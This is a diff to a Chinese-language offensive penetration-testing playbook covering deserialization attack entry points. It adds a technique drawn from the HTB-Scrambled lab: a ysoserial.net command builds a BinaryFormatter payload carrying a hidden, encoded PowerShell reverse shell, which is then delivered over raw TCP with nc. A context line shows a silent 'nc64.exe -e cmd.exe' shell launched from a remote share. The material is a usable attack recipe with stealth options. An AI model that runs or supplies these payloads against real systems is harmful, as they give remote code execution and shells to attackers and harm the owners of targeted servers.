@@ -22,6 +22,7 @@
   - WebLogic：7001 端口 + `/console/`、`/wls-wsat/`、`/_async/`
   - JBoss：`/jmx-console/`、`/invoker/`；Tomcat：8080 + `/manager/html`
 - **反序列化**：Cookie/ViewState 含 `rO0AB`（base64）或 `ac ed 00 05`（hex，Java）；`O:` 开头（PHP）；pickle 以 `\x80\x04` 开头；`.NET` 以 `AAEAAAD/////` 开头。
+- **私有二进制协议**（非 HTTP 入口）：非标 TCP 端口返回 `NAME_VERSION;` 类 banner、任意输入回 `ERROR_UNKNOWN_COMMAND;`——服务端可能直接反序列化客户端上送对象；客户端逆向定位格式化器与协议格式（见 `references/notes/dotnet-client-re.md`）。
 - **文件上传→RCE**：上传点 + 解析配合（Apache 多后缀 / Nginx `fix_pathinfo` / IIS 解析）+ LFI/日志投毒/图片马/.htaccess。
 
 ## 2. 高频入口点
@@ -252,6 +253,13 @@ Ruby `Marshal.load()` 接 cookie/参数（Gadget：`Gem::Installer`/`Gem::Requir
 ```
 
 - **`START /B`**：Windows 不弹窗后台执行，测试期静默验证（`START /B \\IP\share\nc64.exe ... -e cmd.exe`）。
+
+- **BinaryFormatter 走私有 TCP 协议**（非 HTTP 入口，来源：HTB-Scrambled）：非标端口 banner `SCRAMBLECORP_ORDERS_V1.0.3;`、未知命令回 `ERROR_UNKNOWN_COMMAND;`。客户端 dnSpy 逆向确认服务端对上送对象直接 `BinaryFormatter.Deserialize()` 后，用 ysoserial.net 按 `-f BinaryFormatter -g WindowsIdentity` 生成载荷（`-c` 命令用 PowerShell base64 反弹见 `references/notes/field-ops-toolbox.md` §3），再按协议格式裸 TCP 投递——工具链与协议还原见 `references/notes/dotnet-client-re.md`：
+
+```bash
+.\ysoserial.exe -c "powershell -nop -w hidden -enc <PS反弹b64>" -o base64 -g WindowsIdentity -f BinaryFormatter
+# nc 连上服务端口后按协议上送：UPLOAD_ORDER;<ysoserial base64 payload>
+```
 
 ### 4.6 文件上传 → RCE 链 `[本地 src-hunter 13-file-rce-chain.md / Claude-Red offensive-rce]`
 
